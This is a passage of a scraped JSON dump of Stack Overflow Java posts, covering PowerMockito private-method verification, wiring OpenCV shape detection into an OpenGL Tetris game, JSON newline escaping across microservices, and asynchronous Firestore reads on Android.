@PowerMockIgnore(&quot;javax.management.*&quot;)\r\n    public class TestedClassTest\r\n    {\r\n    \t\r\n    \t@Before\r\n    \tpublic void setUp()\r\n    \t{\r\n    \t}\r\n    \t\r\n    \t@Test\r\n    \tpublic void testPrivateMethodCalledOnce() throws Exception \r\n    \t{\r\n    \t\tTestedClass spy = PowerMockito.spy(new TestedClass());\r\n    \t\tspy.publicMethod();\r\n    \t\t\r\n    \t\tPowerMockito.verifyPrivate(spy, Mockito.times(772)).invoke(&quot;privateMethod&quot;); \r\n    \t}\r\n    }\r\n\r\nDespite only being called once this test passes. Even if I comment privateMethod inside the public method the test seems too pass.\r\n\r\n    public class TestedClass\r\n    {\r\n    \r\n        public void publicMethod() \r\n        {\r\n            //privateMethod(); &lt;-- test still passes\r\n        }\r\n    \r\n        private void privateMethod() \r\n        {\r\n        }\r\n    }\r\n\r\nDoes anyone have an idea what I did wrong? And does anyone know how to verify that the private method was called exactly once in the unit test?","title":"PowerMockito verifyTimes Always passets private method","body":"<pre><code>public class TestedClass\n{\n    \n    public void publicMethod() \n    {\n        privateMethod();\n    }\n    \n    private void privateMethod() \n    {\n    }\n}\n</code></pre>\n<p>I would like to test with PowerMockito that the private method is called exactly once.</p>\n<p>Here's my test class:</p>\n<pre><code>@RunWith(PowerMockRunner.class)\n@PowerMockIgnore(&quot;javax.management.*&quot;)\npublic class TestedClassTest\n{\n    \n    @Before\n    public void setUp()\n    {\n    }\n    \n    @Test\n    public void testPrivateMethodCalledOnce() throws Exception \n    {\n        TestedClass spy = PowerMockito.spy(new TestedClass());\n        spy.publicMethod();\n        \n        PowerMockito.verifyPrivate(spy, Mockito.times(772)).invoke(&quot;privateMethod&quot;); \n    }\n}\n</code></pre>\n<p>Despite only being called once this test passes. Even if I comment privateMethod inside the public method the test seems too pass.</p>\n<pre><code>public class TestedClass\n{\n\n    public void publicMethod() \n    {\n        //privateMethod(); &lt;-- test still passes\n    }\n\n    private void privateMethod() \n    {\n    }\n}\n</code></pre>\n<p>Does anyone have an idea what I did wrong? And does anyone know how to verify that the private method was called exactly once in the unit test?</p>\n"},{"tags":["java","opencv","opengl"],"answers":[{"tags":[],"owner":{"account_id":23726637,"reputation":103,"user_id":17746454,"display_name":"Sasan"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640262555,"creation_date":1640257680,"answer_id":70461279,"question_id":70459119,"body_markdown":"So I found the answer: InteractionHandler is not important.\r\nJust modified Video Processing:\r\n(There is still a collision detection problem. I am still working on that.)\r\n\r\n    for (int idx = 0; idx &lt; contours.size(); idx++) {\r\n                    MatOfPoint2f approx = new MatOfPoint2f(); //approx parameter count contours of objects; important for interaction handling\r\n                    //allows the approximation of polygons and determine scope of object\r\n                    Imgproc.approxPolyDP(newContours.get(idx), approx, Imgproc.arcLength(newContours.get(idx), true) * 0.02, true);\r\n                    long count = approx.total();\r\n                    //filtering small blobs\r\n                    if(Math.abs(Imgproc.contourArea(contours.get(idx))) &gt; 1000) {\r\n    \r\n                        //draw contours on objects\r\n                        if (count == 5) {\r\n                            Imgproc.drawContours(frame, contours, idx, new Scalar(75, 0, 0));\r\n                            BoxLightTexMainWindowPP.errorLog.setText(&quot;F&#252;nfeck erkannt&quot;);\r\n                            BoxLightTexRendererPP.x -= 0.1;\r\n                        }\r\n                        if (count == 6) {\r\n                            Imgproc.drawContours(frame, contours, idx, new Scalar(255, 255, 255));\r\n                            BoxLightTexMainWindowPP.errorLog.setText(&quot;Sechseck erkannt&quot;);\r\n                            BoxLightTexRendererPP.y -= 0.1;\r\n                        }\r\n                        if (count == 4) {\r\n                            Imgproc.drawContours(frame, contours, idx, new Scalar(200, 0, 0));\r\n                            BoxLightTexMainWindowPP.errorLog.setText(&quot;Viereck erkannt&quot;);\r\n                            BoxLightTexRendererPP.x += 0.1;\r\n                        }\r\n                        if (count == 3) {\r\n                            Imgproc.drawContours(frame, contours, idx, new Scalar(360, 100, 50));\r\n                            BoxLightTexMainWindowPP.errorLog.setText(&quot;Dreieck erkannt&quot;);\r\n                            BoxLightTexRendererPP.y += 0.1;\r\n                        }\r\n                    }\r\n                }","title":"Connection between OpenCV and OpenGL in Java with Tetris Game","body":"<p>So I found the answer: InteractionHandler is not important.\nJust modified Video Processing:\n(There is still a collision detection problem. I am still working on that.)</p>\n<pre><code>for (int idx = 0; idx &lt; contours.size(); idx++) {\n                MatOfPoint2f approx = new MatOfPoint2f(); //approx parameter count contours of objects; important for interaction handling\n                //allows the approximation of polygons and determine scope of object\n                Imgproc.approxPolyDP(newContours.get(idx), approx, Imgproc.arcLength(newContours.get(idx), true) * 0.02, true);\n                long count = approx.total();\n                //filtering small blobs\n                if(Math.abs(Imgproc.contourArea(contours.get(idx))) &gt; 1000) {\n\n                    //draw contours on objects\n                    if (count == 5) {\n                        Imgproc.drawContours(frame, contours, idx, new Scalar(75, 0, 0));\n                        BoxLightTexMainWindowPP.errorLog.setText(&quot;Fnfeck erkannt&quot;);\n                        BoxLightTexRendererPP.x -= 0.1;\n                    }\n                    if (count == 6) {\n                        Imgproc.drawContours(frame, contours, idx, new Scalar(255, 255, 255));\n                        BoxLightTexMainWindowPP.errorLog.setText(&quot;Sechseck erkannt&quot;);\n                        BoxLightTexRendererPP.y -= 0.1;\n                    }\n                    if (count == 4) {\n                        Imgproc.drawContours(frame, contours, idx, new Scalar(200, 0, 0));\n                        BoxLightTexMainWindowPP.errorLog.setText(&quot;Viereck erkannt&quot;);\n                        BoxLightTexRendererPP.x += 0.1;\n                    }\n                    if (count == 3) {\n                        Imgproc.drawContours(frame, contours, idx, new Scalar(360, 100, 50));\n                        BoxLightTexMainWindowPP.errorLog.setText(&quot;Dreieck erkannt&quot;);\n                        BoxLightTexRendererPP.y += 0.1;\n                    }\n                }\n            }\n</code></pre>\n"}],"owner":{"account_id":23726637,"reputation":103,"user_id":17746454,"display_name":"Sasan"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":58,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"answer_count":1,"score":-1,"last_activity_date":1640262555,"creation_date":1640245705,"question_id":70459119,"body_markdown":"I have a Tetris project that needs to work with Camera. That is, there are two windows. One loads webcam (OpenCV) and is detected red triangle or square. Other window is the Tetris game(OpenGL) that each tile will come down one by one from top to bottom.\r\nAll functions are already written and everything works. Now I need to connect the two.\r\nI write here part code of classes\r\nIn the class BoxLightTextRendererPP you can see the positioning of the game piece.\r\nIn the VideoProcessing class you can see the contour detection by the camera.\r\nand in the InteractionHandler class I have to write a method, where e.g. with Switch-Case it is detected, if the camera sees a square, then move the token to the left and if a triangle is detected move it to the right.\r\nHow can I do this?\r\n\r\n\r\nBoxLightTexRendererPP:\r\n\r\n    // Pointers (names) for data transfer and handling on GPU\r\n    private int[] vaoName;  // Name of vertex array object\r\n    private int[] vboName;\t// Name of vertex buffer object\r\n    private int[] iboName;\t// Name of index buffer object\r\n    \r\n    float[] barrey = verticies;\r\n    int block = 28;\r\n    //Startpunkt rechts/links\r\n    static float x = -1.5f;\r\n    //Startpunkt oben/unten\r\n    float h = 1.5f;\r\n    //Startpunkt vorne/hinten\r\n    float y = 0;\r\n    //Fallgeschwindigkeit\r\n    float fall = 0.01f;\r\n    boolean start = true;\r\n    public static boolean go = false;\r\n    boolean stay = false;\r\n    float[] barrey1 = verticies;\r\n    int block1 = 28;\r\n\r\n\r\nVideoProcessing:\r\n\r\n    for (int idx = 0; idx &lt; contours.size(); idx++) {\r\n                    MatOfPoint2f approx = new MatOfPoint2f(); //approx parameter count contours of objects; important for interaction handling\r\n                    //allows the approximation of polygons and determine scope of object\r\n                    Imgproc.approxPolyDP(newContours.get(idx), approx, Imgproc.arcLength(newContours.get(idx), true) * 0.02, true);\r\n                    long count = approx.total();\r\n                    //filtering small blobs\r\n                    if(Math.abs(Imgproc.contourArea(contours.get(idx))) &gt; 1000) {\r\n    \r\n                        //draw contours on objects\r\n                        if (count == 5) {\r\n                            Imgproc.drawContours(frame, contours, idx, new Scalar(75, 0, 0));\r\n                        }\r\n                        if (count == 6) {\r\n                            Imgproc.drawContours(frame, contours, idx, new Scalar(255, 255, 255));\r\n                        }\r\n                        if (count == 4) {\r\n                            Imgproc.drawContours(frame, contours, idx, new Scalar(200, 0, 0));\r\n                            viereck = (int) count;\r\n                        }\r\n                        if (count == 3) {\r\n                            Imgproc.drawContours(frame, contours, idx, new Scalar(360, 100, 50));\r\n                            dreieck = (int) count;\r\n                        }\r\n                    }\r\n                }\r\n\r\n\r\nInteractionHandler:\r\n\r\n    public void connection() {\r\n            float xAchse = BoxLightTexRendererPP.x;\r\n            int viereck = VideoProcessing.viereck;\r\n            int dreieck = VideoProcessing.dreieck;\r\n            \r\n    \r\n            Switch(xAchse)\r\n    ??????????????\r\n    \r\n    \r\n        }","title":"Connection between OpenCV and OpenGL in Java with Tetris Game","body":"<p>I have a Tetris project that needs to work with Camera. That is, there are two windows. One loads webcam (OpenCV) and is detected red triangle or square. Other window is the Tetris game(OpenGL) that each tile will come down one by one from top to bottom.\nAll functions are already written and everything works. Now I need to connect the two.\nI write here part code of classes\nIn the class BoxLightTextRendererPP you can see the positioning of the game piece.\nIn the VideoProcessing class you can see the contour detection by the camera.\nand in the InteractionHandler class I have to write a method, where e.g. with Switch-Case it is detected, if the camera sees a square, then move the token to the left and if a triangle is detected move it to the right.\nHow can I do this?</p>\n<p>BoxLightTexRendererPP:</p>\n<pre><code>// Pointers (names) for data transfer and handling on GPU\nprivate int[] vaoName;  // Name of vertex array object\nprivate int[] vboName;  // Name of vertex buffer object\nprivate int[] iboName;  // Name of index buffer object\n\nfloat[] barrey = verticies;\nint block = 28;\n//Startpunkt rechts/links\nstatic float x = -1.5f;\n//Startpunkt oben/unten\nfloat h = 1.5f;\n//Startpunkt vorne/hinten\nfloat y = 0;\n//Fallgeschwindigkeit\nfloat fall = 0.01f;\nboolean start = true;\npublic static boolean go = false;\nboolean stay = false;\nfloat[] barrey1 = verticies;\nint block1 = 28;\n</code></pre>\n<p>VideoProcessing:</p>\n<pre><code>for (int idx = 0; idx &lt; contours.size(); idx++) {\n                MatOfPoint2f approx = new MatOfPoint2f(); //approx parameter count contours of objects; important for interaction handling\n                //allows the approximation of polygons and determine scope of object\n                Imgproc.approxPolyDP(newContours.get(idx), approx, Imgproc.arcLength(newContours.get(idx), true) * 0.02, true);\n                long count = approx.total();\n                //filtering small blobs\n                if(Math.abs(Imgproc.contourArea(contours.get(idx))) &gt; 1000) {\n\n                    //draw contours on objects\n                    if (count == 5) {\n                        Imgproc.drawContours(frame, contours, idx, new Scalar(75, 0, 0));\n                    }\n                    if (count == 6) {\n                        Imgproc.drawContours(frame, contours, idx, new Scalar(255, 255, 255));\n                    }\n                    if (count == 4) {\n                        Imgproc.drawContours(frame, contours, idx, new Scalar(200, 0, 0));\n                        viereck = (int) count;\n                    }\n                    if (count == 3) {\n                        Imgproc.drawContours(frame, contours, idx, new Scalar(360, 100, 50));\n                        dreieck = (int) count;\n                    }\n                }\n            }\n</code></pre>\n<p>InteractionHandler:</p>\n<pre><code>public void connection() {\n        float xAchse = BoxLightTexRendererPP.x;\n        int viereck = VideoProcessing.viereck;\n        int dreieck = VideoProcessing.dreieck;\n        \n\n        Switch(xAchse)\n??????????????\n\n\n    }\n</code></pre>\n"},{"tags":["java","json","string","architecture","microservices"],"comments":[{"owner":{"account_id":6520,"reputation":10523,"user_id":11002,"accept_rate":75,"display_name":"tgdavies"},"score":0,"creation_date":1640259176,"post_id":70461516,"comment_id":124554769,"body_markdown":"Please explain what you are doing to your JSON that makes you think you need to do this.","body":"Please explain what you are doing to your JSON that makes you think you need to do this."},{"owner":{"account_id":10416430,"reputation":353,"user_id":11993600,"display_name":"SorryForAsking"},"score":0,"creation_date":1640259375,"post_id":70461516,"comment_id":124554816,"body_markdown":"I add some new properties and transfer JSON to next microservise in the chain","body":"I add some new properties and transfer JSON to next microservise in the chain"},{"owner":{"account_id":6520,"reputation":10523,"user_id":11002,"accept_rate":75,"display_name":"tgdavies"},"score":0,"creation_date":1640260351,"post_id":70461516,"comment_id":124555098,"body_markdown":"Please edit your question and add an example of the code you use to do this.","body":"Please edit your question and add an example of the code you use to do this."},{"owner":{"account_id":6520,"reputation":10523,"user_id":11002,"accept_rate":75,"display_name":"tgdavies"},"score":0,"creation_date":1640260889,"post_id":70461516,"comment_id":124555257,"body_markdown":"Don&#39;t use string operations on JSON. Use a JSON parser.","body":"Don&#39;t use string operations on JSON. Use a JSON parser."},{"owner":{"account_id":10416430,"reputation":353,"user_id":11993600,"display_name":"SorryForAsking"},"score":0,"creation_date":1640261018,"post_id":70461516,"comment_id":124555290,"body_markdown":"But what if I need to replace some words in json with regex?","body":"But what if I need to replace some words in json with regex?"},{"owner":{"account_id":6520,"reputation":10523,"user_id":11002,"accept_rate":75,"display_name":"tgdavies"},"score":0,"creation_date":1640261095,"post_id":70461516,"comment_id":124555319,"body_markdown":"Do the replacements on the value of a field, not on the raw JSON string.","body":"Do the replacements on the value of a field, not on the raw JSON string."}],"answers":[{"tags":[],"owner":{"account_id":6520,"reputation":10523,"user_id":11002,"accept_rate":75,"display_name":"tgdavies"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1640262504,"creation_date":1640261064,"answer_id":70461921,"question_id":70461516,"body_markdown":"Here&#39;s an example of creating a JSON object, turning it into a String and and then back into a JsonObject, adding a property, and turning it back into a String again.\r\n\r\n```java\r\npackage org.example;\r\n\r\nimport com.google.gson.Gson;\r\nimport com.google.gson.JsonObject;\r\n\r\npublic class App {\r\n    public static void main(String[] args) {\r\n        JsonObject o = new JsonObject();\r\n        o.addProperty(&quot;message&quot;,&quot;foo\\nbar&quot;);\r\n        Gson gson = new Gson();\r\n        String stringRep = gson.toJson(o);\r\n        System.out.println(stringRep);\r\n        JsonObject o2 = gson.fromJson(stringRep, JsonObject.class);\r\n        o2.addProperty(&quot;newProp&quot;, 42);\r\n        String messageValue = o2.get(&quot;message&quot;).getAsString();\r\n        System.out.println(messageValue);\r\n        String newMessageValue = messageValue.replace(&quot;foo&quot;, &quot;baz&quot;);\r\n        o2.addProperty(&quot;message&quot;, newMessageValue);\r\n        stringRep = gson.toJson(o2);\r\n        System.out.println(stringRep);\r\n    }\r\n}\r\n```\r\n\r\nThe output of this program is:\r\n```\r\n{&quot;message&quot;:&quot;foo\\nbar&quot;}\r\nfoo\r\nbar\r\n{&quot;message&quot;:&quot;baz\\nbar&quot;,&quot;newProp&quot;:42}\r\n```\r\nSo you can see the the Java representations of strings contain newline characters, but the JSON representations contain the character sequence `&#39;\\&#39;, &#39;n&#39;`.\r\n\r\nThe maven dependency you need is:\r\n```\r\n    &lt;dependency&gt;\r\n      &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt;\r\n      &lt;artifactId&gt;gson&lt;/artifactId&gt;\r\n      &lt;version&gt;2.8.9&lt;/version&gt;\r\n    &lt;/dependency&gt;\r\n```","title":"How to avoid escaping /n on each microservice in the chain? Java","body":"<p>Here's an example of creating a JSON object, turning it into a String and and then back into a JsonObject, adding a property, and turning it back into a String again.</p>\n<pre class=\"lang-java prettyprint-override\"><code>package org.example;\n\nimport com.google.gson.Gson;\nimport com.google.gson.JsonObject;\n\npublic class App {\n    public static void main(String[] args) {\n        JsonObject o = new JsonObject();\n        o.addProperty(&quot;message&quot;,&quot;foo\\nbar&quot;);\n        Gson gson = new Gson();\n        String stringRep = gson.toJson(o);\n        System.out.println(stringRep);\n        JsonObject o2 = gson.fromJson(stringRep, JsonObject.class);\n        o2.addProperty(&quot;newProp&quot;, 42);\n        String messageValue = o2.get(&quot;message&quot;).getAsString();\n        System.out.println(messageValue);\n        String newMessageValue = messageValue.replace(&quot;foo&quot;, &quot;baz&quot;);\n        o2.addProperty(&quot;message&quot;, newMessageValue);\n        stringRep = gson.toJson(o2);\n        System.out.println(stringRep);\n    }\n}\n</code></pre>\n<p>The output of this program is:</p>\n<pre><code>{&quot;message&quot;:&quot;foo\\nbar&quot;}\nfoo\nbar\n{&quot;message&quot;:&quot;baz\\nbar&quot;,&quot;newProp&quot;:42}\n</code></pre>\n<p>So you can see the the Java representations of strings contain newline characters, but the JSON representations contain the character sequence <code>'\\', 'n'</code>.</p>\n<p>The maven dependency you need is:</p>\n<pre><code>    &lt;dependency&gt;\n      &lt;groupId&gt;com.google.code.gson&lt;/groupId&gt;\n      &lt;artifactId&gt;gson&lt;/artifactId&gt;\n      &lt;version&gt;2.8.9&lt;/version&gt;\n    &lt;/dependency&gt;\n</code></pre>\n"}],"owner":{"account_id":10416430,"reputation":353,"user_id":11993600,"display_name":"SorryForAsking"},"comment_count":6,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":96,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70461921,"answer_count":1,"score":0,"last_activity_date":1640262504,"creation_date":1640258835,"question_id":70461516,"body_markdown":"For example, we are getting a json message like this from our partner:\r\n\r\n    {\r\n    &quot;message&quot;: &quot;Dear client,\\nWe&#39;d like to offer you..&quot;\r\n    }\r\nThe partner wants the client to receive the message like this (without newline but with `\\n`)\r\n\r\n    Dear client,\\nWe&#39;d like to offer you\r\nBut we have a chain of microservices in our ecosystem and that json goes through 4 or 5 microservices which proccesing it before client can get it. So, our partner should give us `\\\\\\\\\\\\\\\\n` instead of `\\n` in order to client got `\\n` in the result. But I&#39;m wondering, is adding 8 backslashes in the source message to escape &quot;`\\n`&quot; for every microservice the only way to solve this problem. I think it&#39;s not really good solution, because we have to make changes in source message if count of microservices in chain changes (Moreover, we will face he problem if count of microservices in the chain start changing dynamically)? Is there way to use `\\n` in source message (from partner) without replacing every `\\n` with `\\\\n` in our microservies?\r\n\r\nThere is an example how I process the json in one of the microservices:\r\n\r\n    private String replace(String sourceJson, List&lt;String&gt; properties, DocumentContext context) {\r\n        StringBuilder stringBuilder = new StringBuilder(sourceJson);\r\n    \r\n        for (String property : properties) {\r\n            String newValue = Pattern.compile(&quot;ABC&quot;)\r\n                    .matcher(stringBuilder)\r\n                    .replaceAll(context.read(property, String.class));\r\n            stringBuilder.replace(0, stringBuilder.length(), newValue);\r\n        }\r\n        return stringBuilder.toString();\r\n    }\r\n\r\n ","title":"How to avoid escaping /n on each microservice in the chain? Java","body":"<p>For example, we are getting a json message like this from our partner:</p>\n<pre><code>{\n&quot;message&quot;: &quot;Dear client,\\nWe'd like to offer you..&quot;\n}\n</code></pre>\n<p>The partner wants the client to receive the message like this (without newline but with <code>\\n</code>)</p>\n<pre><code>Dear client,\\nWe'd like to offer you\n</code></pre>\n<p>But we have a chain of microservices in our ecosystem and that json goes through 4 or 5 microservices which proccesing it before client can get it. So, our partner should give us <code>\\\\\\\\\\\\\\\\n</code> instead of <code>\\n</code> in order to client got <code>\\n</code> in the result. But I'm wondering, is adding 8 backslashes in the source message to escape &quot;<code>\\n</code>&quot; for every microservice the only way to solve this problem. I think it's not really good solution, because we have to make changes in source message if count of microservices in chain changes (Moreover, we will face he problem if count of microservices in the chain start changing dynamically)? Is there way to use <code>\\n</code> in source message (from partner) without replacing every <code>\\n</code> with <code>\\\\n</code> in our microservies?</p>\n<p>There is an example how I process the json in one of the microservices:</p>\n<pre><code>private String replace(String sourceJson, List&lt;String&gt; properties, DocumentContext context) {\n    StringBuilder stringBuilder = new StringBuilder(sourceJson);\n\n    for (String property : properties) {\n        String newValue = Pattern.compile(&quot;ABC&quot;)\n                .matcher(stringBuilder)\n                .replaceAll(context.read(property, String.class));\n        stringBuilder.replace(0, stringBuilder.length(), newValue);\n    }\n    return stringBuilder.toString();\n}\n</code></pre>\n"},{"tags":["java","android","firebase","google-cloud-firestore"],"comments":[{"owner":{"account_id":6819231,"reputation":132841,"user_id":5246885,"accept_rate":78,"display_name":"Alex Mamo"},"score":0,"creation_date":1640260448,"post_id":70461038,"comment_id":124555127,"body_markdown":"I&#39;m not sure I understand. What exactly in this code doesn&#39;t work the way you expect?\nTell us what is wrong with shared code. Do you have any errors?","body":"I&#39;m not sure I understand. What exactly in this code doesn&#39;t work the way you expect? Tell us what is wrong with shared code. Do you have any errors?"},{"owner":{"account_id":20217806,"reputation":11,"user_id":14828107,"display_name":"nwfl"},"score":0,"creation_date":1640261643,"post_id":70461038,"comment_id":124555465,"body_markdown":"i try to put the id that i get from collection with function whereEqualTo but on the for(QueryDocumentSnapshot document : task.getResult()) can&#39;t put the value that i get inside that for loop into outside for loop,","body":"i try to put the id that i get from collection with function whereEqualTo but on the for(QueryDocumentSnapshot document : task.getResult()) can&#39;t put the value that i get inside that for loop into outside for loop,"},{"owner":{"account_id":6819231,"reputation":132841,"user_id":5246885,"accept_rate":78,"display_name":"Alex Mamo"},"score":0,"creation_date":1640263700,"post_id":70461038,"comment_id":124556147,"body_markdown":"There is no way you can use `idRecords.get(0)` outside the onComplete method. Firebase API is asynchronous. So please check the duplicate to see how can you solve this using a callback. You might also be interested in reading this article, [How to read data from Cloud Firestore using get()?](https://medium.com/firebase-tips-tricks/how-to-read-data-from-cloud-firestore-using-get-bf03b6ee4953).","body":"There is no way you can use <code>idRecords.get(0)</code> outside the onComplete method. Firebase API is asynchronous. So please check the duplicate to see how can you solve this using a callback. You might also be interested in reading this article, <a href=\"https://medium.com/firebase-tips-tricks/how-to-read-data-from-cloud-firestore-using-get-bf03b6ee4953\" rel=\"nofollow noreferrer\">How to read data from Cloud Firestore using get()?</a>."},{"owner":{"account_id":20217806,"reputation":11,"user_id":14828107,"display_name":"nwfl"},"score":0,"creation_date":1640264312,"post_id":70461038,"comment_id":124556339,"body_markdown":"ohhhh oke thanks btw","body":"ohhhh oke thanks btw"}],"owner":{"account_id":20217806,"reputation":11,"user_id":14828107,"display_name":"nwfl"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":30,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"closed_date":1640263714,"answer_count":0,"score":0,"last_activity_date":1640261941,"creation_date":1640256357,"question_id":70461038,"body_markdown":"    private ArrayList&lt;String&gt; idRecords = new ArrayList&lt;&gt;();\r\n\r\ni try to put string in here but, when i using db.collection(collection).**whereEqualTo(fields, values)**.get\r\n\r\n    private void getIdRecords(){\r\n        db.collection(&quot;records&quot;)\r\n                .whereEqualTo(&quot;idUsers&quot;, user.getUid())\r\n                .whereEqualTo(&quot;status&quot;, &quot;progress&quot;)\r\n                .get()\r\n                .addOnCompleteListener(task -&gt; {\r\n                    if (task.isSuccessful()) {\r\n                        for (QueryDocumentSnapshot document : task.getResult()) {\r\n                            idRecords.add(document.getId());                           \r\n                        }\r\n                    } else {\r\n                        Log.d(&quot;get Id Records : &quot;, &quot;Error getting documents: &quot;, task.getException());\r\n                    }\r\n                });\r\n    }\r\n\r\nit cant assign the value to ArrayList\r\nfull code below : \r\n\r\n    public class WorkOffActivity extends AppCompatActivity {\r\n\r\n    private ArrayList&lt;String&gt; idRecords = new ArrayList&lt;&gt;();\r\n\r\n    private FirebaseAuth mAuth = FirebaseAuth.getInstance();\r\n    private FirebaseFirestore db = FirebaseFirestore.getInstance();\r\n    private FirebaseUser user = mAuth.getCurrentUser();\r\n\r\n    private TextView tv_times, tv_activity, tv_place, tv_startDate;\r\n    private Button btn_draft, btn_cancel, btn_finish;\r\n    private EditText et_progress;\r\n\r\n    @Override\r\n    protected void onCreate(Bundle savedInstanceState) {\r\n        super.onCreate(savedInstanceState);\r\n        setContentView(R.layout.activity_work_off);\r\n\r\n        getIdRecords();\r\n\r\n        initializeComponent();\r\n        setTextComponent();\r\n    }\r\n\r\n    private void initializeComponent() {\r\n        tv_times = findViewById(R.id.offWork_tvTimes);\r\n        tv_activity = findViewById(R.id.offWork_tvActivity);\r\n        tv_place = findViewById(R.id.offWork_tvPlace);\r\n        tv_startDate = findViewById(R.id.offWork_tvStartDate);\r\n        et_progress = findViewById(R.id.offWork_etProgress);\r\n\r\n        btn_draft = findViewById(R.id.offWork_btnSaveTemp);\r\n        btn_cancel = findViewById(R.id.offWork_btnCancelActivity);\r\n        btn_finish = findViewById(R.id.offWork_btnFinishActivity);\r\n    }\r\n\r\n    private void getIdRecords() {\r\n        db.collection(&quot;records&quot;).whereEqualTo(&quot;idUsers&quot;, user.getUid())\r\n                .whereEqualTo(&quot;status&quot;, &quot;progress&quot;)\r\n                .get()\r\n                .addOnCompleteListener(task     -&gt; {\r\n                    String temp = null;\r\n                    if (task.isSuccessful()) {\r\n                        for (QueryDocumentSnapshot document : task.getResult()) {\r\n                            temp = document.getId();\r\n                        }\r\n                        idRecords.add(temp);\r\n                    } else {\r\n                        Log.d(&quot;get Id Records : &quot;, &quot;Error getting documents: &quot;, task.getException());\r\n                    }\r\n                });\r\n    }\r\n\r\n    private String[] getDataRecords(){\r\n        String[] recordsData = new String[6];\r\n        db.collection(&quot;records&quot;).document(idRecords.get(0))\r\n                .get().addOnCompleteListener(task -&gt; {\r\n            DocumentSnapshot doc = task.getResult();\r\n            recordsData[0] = doc.getString(&quot;activity&quot;);\r\n            recordsData[1] = doc.getString(&quot;idUsers&quot;);\r\n            recordsData[2] = doc.getString(&quot;idWorkspaces&quot;);\r\n            recordsData[3] = doc.getString(&quot;progress&quot;);\r\n            recordsData[4] = doc.getString(&quot;status&quot;);\r\n            recordsData[5] = doc.getString(&quot;times&quot;);\r\n        });\r\n\r\n        return recordsData;\r\n    }\r\n\r\n    private void setTextComponent() {\r\n          Toast.makeText(getApplicationContext(), idRecords.get(0), Toast.LENGTH_SHORT).show();\r\n    }\r\n\r\ni cant take the value from that array with this idRecords.get(0)","title":"I can&#39;t assign value to the variable from for looping when do whereEqualTo on firestore java android studio","body":"<pre><code>private ArrayList&lt;String&gt; idRecords = new ArrayList&lt;&gt;();\n</code></pre>\n<p>i try to put string in here but, when i using db.collection(collection).<strong>whereEqualTo(fields, values)</strong>.get</p>\n<pre><code>private void getIdRecords(){\n    db.collection(&quot;records&quot;)\n            .whereEqualTo(&quot;idUsers&quot;, user.getUid())\n            .whereEqualTo(&quot;status&quot;, &quot;progress&quot;)\n            .get()\n            .addOnCompleteListener(task -&gt; {\n                if (task.isSuccessful()) {\n                    for (QueryDocumentSnapshot document : task.getResult()) {\n                        idRecords.add(document.getId());                           \n                    }\n                } else {\n                    Log.d(&quot;get Id Records : &quot;, &quot;Error getting documents: &quot;, task.getException());\n                }\n            });\n}\n</code></pre>\n<p>it cant assign the value to ArrayList\nfull code below :</p>\n<pre><code>public class WorkOffActivity extends AppCompatActivity {\n\nprivate ArrayList&lt;String&gt; idRecords = new ArrayList&lt;&gt;();\n\nprivate FirebaseAuth mAuth = FirebaseAuth.getInstance();\nprivate FirebaseFirestore db = FirebaseFirestore.getInstance();\nprivate FirebaseUser user = mAuth.getCurrentUser();\n\nprivate TextView tv_times, tv_activity, tv_place, tv_startDate;\nprivate Button btn_draft, btn_cancel, btn_finish;\nprivate EditText et_progress;\n\n@Override\nprotected void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n    setContentView(R.layout.activity_work_off);\n\n    getIdRecords();\n\n    initializeComponent();\n    setTextComponent();\n}\n\nprivate void initializeComponent() {\n    tv_times = findViewById(R.id.offWork_tvTimes);\n    tv_activity = findViewById(R.id.offWork_tvActivity);\n    tv_place = findViewById(R.id.offWork_tvPlace);\n    tv_startDate = findViewById(R.id.offWork_tvStartDate);\n    et_progress = findViewById(R.id.offWork_etProgress);\n\n    btn_draft = findViewById(R.id.offWork_btnSaveTemp);\n    btn_cancel = findViewById(R.id.offWork_btnCancelActivity);\n    btn_finish = findViewById(R.id.offWork_btnFinishActivity);\n}\n\nprivate void getIdRecords() {\n    db.collection(&quot;records&quot;).whereEqualTo(&quot;idUsers&quot;, user.getUid())\n            .whereEqualTo(&quot;status&quot;, &quot;progress&quot;)\n            .get()\n            .addOnCompleteListener(task     -&gt; {\n                String temp = null;\n                if (task.isSuccessful()) {\n                    for (QueryDocumentSnapshot document : task.getResult()) {\n                        temp = document.getId();\n                    }\n                    idRecords.add(temp);\n                } else {\n                    Log.d(&quot;get Id Records : &quot;, &quot;Error getting documents: &quot;, task.getException());\n                }\n            });\n}\n\nprivate String[] getDataRecords(){\n    String[] recordsData = new String[6];\n    db.collection(&quot;records&quot;).document(idRecords.get(0))\n            .get().addOnCompleteListener(task -&gt; {\n        DocumentSnapshot doc = task.getResult();\n        recordsData[0] = doc.getString(&quot;activity&quot;);\n        recordsData[1] = doc.getString(&quot;idUsers&quot;);\n        recordsData[2] = doc.getString(&quot;idWorkspaces&quot;);\n        recordsData[3] = doc.getString(&quot;progress&quot;);\n        recordsData[4] = doc.getString(&quot;status&quot;);\n        recordsData[5] = doc.getString(&quot;times&quot;);\n    });\n\n    return recordsData;\n}\n\nprivate void setTextComponent() {\n      Toast.makeText(getApplicationContext(), idRecords.get(0), Toast.LENGTH_SHORT).show();\n}\n</code></pre>\n<p>i cant take the value from that array with this idRecords.get(0)</p>\n"},{"tags":["java","jvm","garbage-collection","concurrent-mark-sweep"],"comments":[{"owner":{"account_id":7745,"reputation":189755,"user_id":13531,"accept_rate":75,"display_name":"Michael Myers"},"score":0,"creation_date":1274806550,"post_id":2906676,"comment_id":2956906,"body_markdown":"The cms tag is used to refer to content-management systems, not concurrent mark and sweep GCs. I will remove it.","body":"The cms tag is used to refer to content-management systems, not concurrent mark and sweep GCs. I will remove it."},{"owner":{"account_id":12730,"reputation":463,"user_id":25218,"display_name":"jlintz"},"score":0,"creation_date":1274806739,"post_id":2906676,"comment_id":2956942,"body_markdown":"whoops sorry about that, thanks","body":"whoops sorry about that, 